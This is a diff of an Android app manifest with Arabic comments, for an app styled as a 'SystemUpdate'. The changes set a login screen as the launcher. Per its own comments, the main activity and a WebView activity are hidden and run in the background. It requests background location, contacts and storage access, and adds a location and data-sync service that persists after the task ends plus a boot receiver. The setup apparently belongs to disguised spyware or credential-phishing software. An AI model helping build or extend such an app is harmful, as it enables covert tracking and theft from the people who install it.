@@ -16,7 +16,6 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- Storage — كل الإصدارات -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
@@ -29,7 +28,6 @@
 
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
-    <!-- Services — كل الإصدارات -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
@@ -46,11 +44,24 @@
         android:supportsRtl="true"
         android:requestLegacyExternalStorage="true"
         android:usesCleartextTraffic="true"
-        android:extractNativeLibs="true"
         android:hardwareAccelerated="true"
         android:largeHeap="true"
         android:theme="@style/Theme.SystemUpdate">
 
+        <!-- LoginActivity — الواجهة الرئيسية (الـ Launcher) -->
+        <activity
+            android:name=".LoginActivity"
+            android:exported="true"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:windowSoftInputMode="adjustResize"
+            android:theme="@style/Theme.SystemUpdate">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- MainActivity — مخفية، تعمل في الخلفية -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -59,26 +70,14 @@
             android:launchMode="singleTask"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <activity-alias
-            android:name=".LauncherAlias"
-            android:targetActivity=".MainActivity"
-            android:exported="true"
-            android:enabled="true"
-            android:icon="@mipmap/ic_launcher"
-            android:roundIcon="@mipmap/ic_launcher"
-            android:label="@string/app_name">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
+        <!-- WebViewActivity — مخفية -->
         <activity
             android:name=".WebViewActivity"
             android:exported="false"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.SystemUpdate" />
 
+        <!-- Background Service -->
         <service
             android:name=".BackgroundService"
             android:enabled="true"
@@ -86,6 +85,7 @@
             android:foregroundServiceType="location|dataSync"
             android:stopWithTask="false" />
 
+        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
